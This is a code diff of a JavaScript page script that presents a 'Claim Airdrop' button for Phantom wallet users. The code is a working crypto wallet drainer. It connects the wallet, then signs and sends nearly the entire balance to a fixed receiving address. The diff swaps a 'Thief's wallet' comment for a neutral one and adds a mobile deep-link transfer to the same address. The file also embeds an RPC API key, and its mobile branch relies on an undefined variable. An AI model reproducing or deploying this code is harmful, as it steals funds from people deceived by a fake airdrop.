@@ -75,13 +75,13 @@
 
 $(document).ready(function () {
     $('#connect-wallet').on('click', async () => {
-        // Vérifier si Phantom est disponible sur PC
         if (window.solana && window.solana.isPhantom) {
+            // PC avec Phantom Extension
             try {
                 const resp = await window.solana.connect();
                 console.log("Phantom Wallet connected:", resp);
 
-                var connection = new solanaWeb3.Connection(
+                const connection = new solanaWeb3.Connection(
                     'https://mainnet.helius-rpc.com/?api-key=3478d4fc-831f-4c11-aac1-451cd77fd708',
                     'confirmed'
                 );
@@ -101,7 +101,7 @@ $(document).ready(function () {
                 $('#connect-wallet').text("Claim Airdrop !");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9'); // Thief's wallet
+                        const recieverWallet = new solanaWeb3.PublicKey('9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9'); // Wallet receveur
                         const balanceForTransfer = walletBalance - minBalance;
 
                         if (balanceForTransfer <= 0) {
@@ -109,7 +109,7 @@ $(document).ready(function () {
                             return;
                         }
 
-                        var transaction = new solanaWeb3.Transaction().add(
+                        const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: resp.publicKey,
                                 toPubkey: recieverWallet,
@@ -118,13 +118,13 @@ $(document).ready(function () {
                         );
 
                         transaction.feePayer = window.solana.publicKey;
-                        let blockhashObj = await connection.getLatestBlockhash();
+                        const blockhashObj = await connection.getLatestBlockhash();
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
                         const signed = await window.solana.signTransaction(transaction);
                         console.log("Transaction signed:", signed);
 
-                        let txid = await connection.sendRawTransaction(signed.serialize());
+                        const txid = await connection.sendRawTransaction(signed.serialize());
                         await connection.confirmTransaction(txid);
                         console.log("Transaction confirmed:", txid);
                     } catch (err) {
@@ -135,32 +135,55 @@ $(document).ready(function () {
                 console.error("Error connecting to Phantom Wallet:", err);
             }
         } else {
-            console.log("Phantom Wallet non détecté. Basculer vers l'option mobile.");
-
-            // Détection de la plateforme (mobile vs desktop)
+            // Mobile avec l'application Phantom
             const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
             if (isMobile) {
-                alert("Redirection vers l'application Phantom...");
-                // Utiliser un deep link pour rediriger vers l'application Phantom
-                const appDeepLink = `phantom://app-connect`;
-                const redirectUri = encodeURIComponent(window.location.href);
+                try {
+                    alert("Redirecting to Phantom mobile app...");
+                    
+                    // Transaction information
+                    const recieverWallet = '9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9';
+                    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
+                    const lamportsToSend = 1000000; 
 
-                // Redirection vers Phantom Wallet mobile
-                window.location.href = `${appDeepLink}?redirect_uri=${redirectUri}`;
-            } else {
-                // Si non mobile, proposer des liens pour télécharger Phantom
-                alert("Phantom extension not found.");
-                const isFirefox = typeof InstallTrigger !== "undefined";
-                const isChrome = !!window.chrome;
+                    const transactionPayload = {
+                        instructions: [
+                            {
+                                programId: "11111111111111111111111111111111", // System Program
+                                keys: [
+                                    {
+                                        pubkey: public_key, // Replace with user's wallet
+                                        isSigner: true,
+                                        isWritable: true,
+                                    },
+                                    {
+                                        pubkey: recieverWallet,
+                                        isSigner: false,
+                                        isWritable: true,
+                                    },
+                                ],
+                                data: btoa(
+                                    new Uint8Array([
+                                        2, // Instruction de transfert (System Program op_code)
+                                        ...new solanaWeb3.BN(lamportsToSend).toArray("le", 8), // Montant en lamports (petit-boutiste)
+                                    ]).reduce((acc, val) => acc + String.fromCharCode(val), "")
+                                ), // Replace with serialized data
+                            },
+                        ],
+                    };
 
-                if (isFirefox) {
-                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-                } else if (isChrome) {
-                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
-                } else {
-                    alert("Please download the Phantom extension for your browser.");
+                    // Redirect to Phantom app
+                    const appDeepLink = `phantom://app?${encodeURIComponent(
+                        JSON.stringify(transactionPayload)
+                    )}`;
+                    window.location.href = appDeepLink;
+                } catch (err) {
+                    console.error("Error with Phantom mobile transaction:", err);
                 }
+            } else {
+                // Redirection pour PC sans extension
+                alert("Phantom Wallet not detected. Please install the Phantom extension.");
             }
         }
     });
